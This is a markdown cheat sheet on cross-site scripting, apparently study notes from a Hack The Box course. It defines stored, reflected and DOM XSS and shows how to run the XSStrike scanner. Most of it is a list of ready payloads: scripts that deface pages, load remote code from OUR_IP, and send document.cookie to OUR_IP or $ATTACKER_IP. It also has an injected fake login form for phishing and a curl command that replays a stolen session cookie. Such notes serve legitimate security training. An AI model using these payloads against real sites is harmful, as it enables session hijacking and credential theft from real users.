
### <span style="color:#50FA7B">⚡ **What is Stored XSS?**</span>
Stored XSS means the attacker puts JavaScript code into a website (like a comment box or to-do list), and that code gets saved in the server's database. When anyone opens that page, the script runs in their browser, not just yours.

### <span style="color:#50FA7B">⚡ What is Reflected XSS?</span>

- Reflected XSS happens when your input (like a name or comment) is sent to the **server** and then quickly shown back in the webpage **without being cleaned (filtered)**.
- The input **is not saved** on the website — it only appears in the **same session** and **disappears on refresh**.
- That’s why it’s called **Non-Persistent XSS** (temporary).

### <span style="color:#50FA7B">💡 What is DOM XSS?</span>

- **DOM XSS** is a type of XSS attack that happens **only in your browser**.
- It **does not send data to the server** — instead, the browser’s **JavaScript reads your input and updates the page** using it.
- DOM = **Document Object Model** (how the browser builds and shows the web page).

#### <span style="color:#FFB86C">Automated tool:</span>
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py

python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 

```

#### <span style="color:#FFB86C">Payloads</span>
- https://github.com/payloadbox/xss-payload-list
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md


## <span style="color:#8BE9FD">XSS Testing Payloads</span>

```html
# Basic XSS Payload
<script>alert(document.cookie)</script>
<img src="" onerror="alert(document.cookie)">
<img src=x onerror=alert(1)>
<script>alert(window.origin)</script>
<plaintext>
<script>print()</script>

# HTML-based XSS Payload
<img src="" onerror=alert(window.origin)>

# Change Background Color
<script>document.body.style.background = "#141d2b"</script>

# Change Background Image
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>

# Change Website Title
<script>document.title = 'HackTheBox Academy'</script>

# Overwrite website's main body
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>

# Remove certain HTML element
<script>document.getElementById('urlform').remove();</script>

# Load remote script
<script src="http://OUR_IP/script.js"></script>

#Send Cookie details to us
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>

```

## <span style="color:#8BE9FD">Phishing</span>
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP:PORT><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

## <span style="color:#8BE9FD">Session Hijacking</span>

1. testing payload
```bash
"><script src=http://$ATTACKER_IP></script>
```
2. payload for fetching cookie
```bash
"><img src=1 onerror="location='http://$ATTACKER_IP:8080?c='+document.cookie">
```
3. using the cookie as curl
```bash
curl --cookie "cookie=c00k1355h0u1d8353cu23d" http://$VICTIM_IP/hijacking/login.php
```